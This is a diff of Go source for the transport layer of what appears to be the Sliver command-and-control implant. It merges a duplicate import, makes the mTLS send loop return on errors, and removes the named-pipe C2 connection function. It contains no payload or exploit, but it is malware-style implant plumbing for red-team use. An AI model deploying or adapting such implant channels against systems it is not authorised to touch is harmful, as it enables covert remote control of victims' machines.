@@ -40,7 +40,6 @@ import (
 	"sync"
 	"time"
 
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 
 	// {{if .Config.HTTPc2Enabled}}
@@ -130,8 +129,8 @@ func (c *Connection) RemoveTunnel(ID uint64) {
 }
 
 func (c *Connection) RequestResend(data []byte) {
-	c.Send <- &sliverpb.Envelope{
-		Type: sliverpb.MsgTunnelData,
+	c.Send <- &pb.Envelope{
+		Type: pb.MsgTunnelData,
 		Data: data,
 	}
 }
@@ -400,12 +399,12 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 				}
 				err := socketWriteEnvelope(conn, envelope)
 				if err != nil {
-					break
+					return
 				}
 			case <-time.After(mtlsPingInterval):
 				socketWritePing(conn)
 				if err != nil {
-					break
+					return
 				}
 			}
 		}
@@ -670,64 +669,6 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 }
 
 // {{end}} - .DNSc2Enabled
-
-// {{if .Config.NamePipec2Enabled}}
-func namedPipeConnect(uri *url.URL) (*Connection, error) {
-	conn, err := namePipeDial(uri)
-	if err != nil {
-		return nil, err
-	}
-	send := make(chan *pb.Envelope)
-	recv := make(chan *pb.Envelope)
-	ctrl := make(chan bool, 1)
-	connection := &Connection{
-		Send:    send,
-		Recv:    recv,
-		ctrl:    ctrl,
-		tunnels: &map[uint64]*Tunnel{},
-		mutex:   &sync.RWMutex{},
-		once:    &sync.Once{},
-		IsOpen:  true,
-		cleanup: func() {
-			// {{if .Config.Debug}}
-			log.Printf("[namedpipe] lost connection, cleanup...")
-			// {{end}}
-			close(send)
-			ctrl <- true
-			close(recv)
-		},
-	}
-
-	go func() {
-		defer connection.Cleanup()
-		for envelope := range send {
-			// {{if .Config.Debug}}
-			log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
-			// {{end}}
-			namedPipeWriteEnvelope(&conn, envelope)
-		}
-	}()
-
-	go func() {
-		defer connection.Cleanup()
-		for {
-			envelope, err := namedPipeReadEnvelope(&conn)
-			if err == io.EOF {
-				break
-			}
-			if err == nil {
-				recv <- envelope
-				// {{if .Config.Debug}}
-				log.Printf("[namedpipe] Receive loop envelope type %d\n", envelope.Type)
-				// {{end}}
-			}
-		}
-	}()
-	activeConnection = connection
-	return connection, nil
-}
-
-// {{end}} -NamePipec2Enabled
 
 // {{if .Config.TCPPivotc2Enabled}}
 func tcpPivotConnect(uri *url.URL) (*Connection, error) {
